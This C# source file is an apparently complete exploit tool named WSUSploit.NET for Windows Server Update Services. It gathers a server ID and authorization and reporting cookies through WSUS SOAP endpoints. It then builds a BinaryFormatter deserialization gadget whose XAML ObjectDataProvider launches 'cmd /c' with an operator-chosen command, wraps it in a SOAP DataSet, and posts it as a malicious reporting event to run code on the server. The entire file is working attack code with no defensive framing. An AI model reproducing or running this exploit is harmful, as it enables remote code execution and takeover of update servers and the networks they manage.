using System;
using System.Text;
using System.Net.Http;
using System.Xml.Linq;
using System.Security;
using System.Windows.Data;
using WSUSploit.NET;
using System.Diagnostics;
using System.IO;
using System.Xml;
using System.Windows.Markup;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows;
using System.Collections.Specialized;
using System.Reflection;
using System.Runtime.Serialization;

if (args.Length < 2)
{
    Console.WriteLine("Usage: WSUSploit.NET <URL> <CMD>");
    return;
}

Uri serverUri = new Uri(args[0]);
string cmd = args[1];

Console.WriteLine($"[*] Running against {serverUri}");

WSUSServer server = new WSUSServer(serverUri);
await server.GetServerId();
await server.GetAuthCookie();
await server.GetReportingCookie();

string payload = new Sploit().Create(cmd); 
await server.SendMaliciousEvent(payload);



namespace WSUSploit.NET
{


    [Serializable]
    public class TextFormattingRunPropertiesMock : ISerializable
    {
        public object ForegroundBrush { get; set; }

        public TextFormattingRunPropertiesMock() { }

        protected TextFormattingRunPropertiesMock(SerializationInfo info, StreamingContext context)
        {
            ForegroundBrush = info.GetValue("ForegroundBrush", typeof(object));
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            // Set the exact type information to match your target
            info.SetType(typeof(TextFormattingRunPropertiesMock));
            info.AssemblyName = "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
            info.FullTypeName = "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties";
            info.AddValue("ForegroundBrush", ForegroundBrush);
        }
    }
    class Sploit
    {
        public Sploit() { } 

        public string Create(string command)
        {

            // Build XAML string
            string xaml = $@"<ObjectDataProvider MethodName=""Start"" IsInitialLoadEnabled=""False"" xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:sd=""clr-namespace:System.Diagnostics;assembly=System"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments=""/c {SecurityElement.Escape(command)}"" StandardErrorEncoding=""{{x:Null}}"" StandardOutputEncoding=""{{x:Null}}"" UserName="""" Password=""{{x:Null}}"" Domain="""" LoadUserProfile=""False"" FileName=""cmd"" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>";

            var wrapper = new TextFormattingRunPropertiesMock { ForegroundBrush = xaml };


            // Serialize with BinaryFormatter
#pragma warning disable SYSLIB0011
            BinaryFormatter formatter = new BinaryFormatter();
#pragma warning restore SYSLIB0011

            using (MemoryStream ms = new MemoryStream())
            {
                formatter.Serialize(ms, wrapper);
                byte[] payload = ms.ToArray();
                string b64Payload = Convert.ToBase64String(payload);
                Console.WriteLine("[*] Final payload: " + b64Payload);
                return b64Payload;
            }
        }
    }

    class WSUSServer
    {
        public string ServerId { get; set; } = "";
        public int Port { get; set; }
        public Uri URL { get; set; }
        public string AuthCookie { get; set; } = "";
        public record ReportingCookie(string EncryptedData, string Expiration);
        public ReportingCookie reportingCookie { get; set; }

        private readonly HttpClient _httpClient;

        public WSUSServer(Uri url)
        {
            if (url.Port != 8530 && url.Port != 8531)
            {
                Console.WriteLine("[!] WARNING: Not specifying standard WSUS port 8530/8531");
            }

            _httpClient = new HttpClient();
            _httpClient.BaseAddress = url;
            _httpClient.Timeout = TimeSpan.FromSeconds(30);

            URL = url;
        }

        public async Task GetServerId()
        {
            Console.WriteLine("[*] Fetching Server ID...");

            string soapBody = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetRollupConfiguration xmlns=""http://www.microsoft.com/SoftwareDistribution"">
            <cookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            </GetRollupConfiguration>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration");

            var response = await _httpClient.PostAsync("/ReportingWebService/ReportingWebService.asmx", content);

            response.EnsureSuccessStatusCode();

            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespaces
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution";

            // Extract ServerId
            string? serverId = xmlDoc
                .Descendants(msNs + "ServerId")
                .FirstOrDefault()?.Value;

            if (serverId == null)
            {
                Console.WriteLine("[!] ERROR: Server ID is null! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] ServerId: {serverId}");

            this.ServerId = serverId;
        }

        public async Task GetAuthCookie()
        {
            Console.WriteLine("[*] Fetching AuthCookie...");

            string soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetAuthorizationCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService"">
            <clientId>{this.ServerId}</clientId>
            <targetGroupName></targetGroupName>
            <dnsName>hawktrace.local</dnsName>
            </GetAuthorizationCookie>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie");

            var response = await _httpClient.PostAsync("/SimpleAuthWebService/SimpleAuth.asmx", content);
            response.EnsureSuccessStatusCode();
            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespace
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService";

            // Extract CookieData
            string? cookieData = xmlDoc
                .Descendants(msNs + "CookieData")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(cookieData))
            {
                Console.WriteLine("[!] ERROR: CookieData not found! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] CookieData: {cookieData}");

            this.AuthCookie = cookieData;
        }

        public async Task GetReportingCookie()
        {
            Console.WriteLine("[*] Fetching ReportingCookie...");

            string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss'Z'");
            var soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"">
            <authCookies>
            <AuthorizationCookie>
            <PlugInId>SimpleTargeting</PlugInId>
            <CookieData>{this.AuthCookie}</CookieData>
            </AuthorizationCookie>
            </authCookies>
            <oldCookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            <lastChange>{timeNow}</lastChange>
            <currentTime>{timeNow}</currentTime>
            <protocolVersion>1.20</protocolVersion>
            </GetCookie>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie");

            var response = await _httpClient.PostAsync("/ClientWebService/Client.asmx", content);
            response.EnsureSuccessStatusCode();

            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService";

            string? encryptedData = xmlDoc
                .Descendants(msNs + "EncryptedData")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(encryptedData))
            {
                Console.WriteLine("[!] ERROR: EncryptedData not found! Exiting...");
                Environment.Exit(1);
            }

            string? expiration = xmlDoc
                .Descendants(msNs + "Expiration")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(expiration))
            {
                Console.WriteLine("[!] ERROR: Expiration not found! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] GetCookieResult EncryptedData retrieved : (length: {encryptedData.Length})");
            Console.WriteLine($"[*] GetCookieResult Expiration retrieved : {expiration}");

            this.reportingCookie = new ReportingCookie(encryptedData, expiration);

        }

        public async Task SendMaliciousEvent(string b64Payload)
        {
            Console.WriteLine("[*] Sending malicious event...");

            string targetSid = Guid.NewGuid().ToString();
            string eventInstanceId = Guid.NewGuid().ToString();
            string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fff");
            string payloadEnvelope = $@"<SOAP-ENV:Envelope
	            xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	            xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
	            xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/""
	            xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/""
	            xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
	            <SOAP-ENV:Body>
		            <a1:DataSet id=""ref-1""
			            xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"">
			            <DataSet.RemotingFormat xsi:type=""a1:SerializationFormat""
				            xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"">Binary
			            </DataSet.RemotingFormat>
			            <DataSet.DataSetName id=""ref-3""></DataSet.DataSetName>
			            <DataSet.Namespace href=""#ref-3""/>
			            <DataSet.Prefix href=""#ref-3""/>
			            <DataSet.CaseSensitive>false</DataSet.CaseSensitive>
			            <DataSet.LocaleLCID>1033</DataSet.LocaleLCID>
			            <DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>
			            <DataSet.ExtendedProperties xsi:type=""xsd:anyType"" xsi:null=""1""/>
			            <DataSet.Tables.Count>1</DataSet.Tables.Count>
			            <DataSet.Tables_0 href=""#ref-4""/>
		            </a1:DataSet>
		            <SOAP-ENC:Array id=""ref-4"" xsi:type=""SOAP-ENC:base64"">{b64Payload}</SOAP-ENC:Array>
	            </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>";

            string soapBody = $@"<soap:Envelope
	            xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""
	            xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	            xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
	            xmlns:soapenc=""http://schemas.xmlsoap.org/soap/encoding/"">
	            <soap:Body>
		            <ReportEventBatch
			            xmlns=""http://www.microsoft.com/SoftwareDistribution"">
			            <cookie>
				            <Expiration>{this.reportingCookie.Expiration}</Expiration>
				            <EncryptedData>{this.reportingCookie.EncryptedData}</EncryptedData>
			            </cookie>
			            <clientTime>{timeNow}</clientTime>
			            <eventBatch
				            xmlns:q1=""http://www.microsoft.com/SoftwareDistribution"" soapenc:arrayType=""q1:ReportingEvent[1]"">
				            <ReportingEvent>
					            <BasicData>
						            <TargetID>
							            <Sid>{targetSid}</Sid>
						            </TargetID>
						            <SequenceNumber>0</SequenceNumber>
						            <TimeAtTarget>{timeNow}</TimeAtTarget>
						            <EventInstanceID>{eventInstanceId}</EventInstanceID>
						            <NamespaceID>2</NamespaceID>
						            <EventID>389</EventID>
						            <SourceID>301</SourceID>
						            <UpdateID>
							            <UpdateID>00000000-0000-0000-0000-000000000000</UpdateID>
							            <RevisionNumber>0</RevisionNumber>
						            </UpdateID>
						            <Win32HResult>0</Win32HResult>
						            <AppName>LocalServer</AppName>
					            </BasicData>
					            <ExtendedData>
						            <MiscData soapenc:arrayType=""xsd:string[2]"">
							            <string>Administrator=SYSTEM</string>
							            <string>SynchronizationUpdateErrorsKey={SecurityElement.Escape(payloadEnvelope)}</string>
						            </MiscData>
					            </ExtendedData>
					            <PrivateData>
						            <ComputerDnsName></ComputerDnsName>
						            <UserAccountName></UserAccountName>
					            </PrivateData>
				            </ReportingEvent>
			            </eventBatch>
		            </ReportEventBatch>
	            </soap:Body>
            </soap:Envelope>";

            var request = new HttpRequestMessage(HttpMethod.Post, "/ReportingWebService/ReportingWebService.asmx");
            
            request.Headers.Add("Connection", "Keep-Alive");
            request.Headers.Add("Accept", "text/xml");
            request.Headers.Add("User-Agent", "Windows-Update-Agent");
            request.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/ReportEventBatch");
            request.Content = new StringContent(soapBody, Encoding.UTF8, "text/xml");

            var response = await _httpClient.SendAsync(request);
            var responseBody = await response.Content.ReadAsStringAsync();
            response.EnsureSuccessStatusCode();
        }

    }
}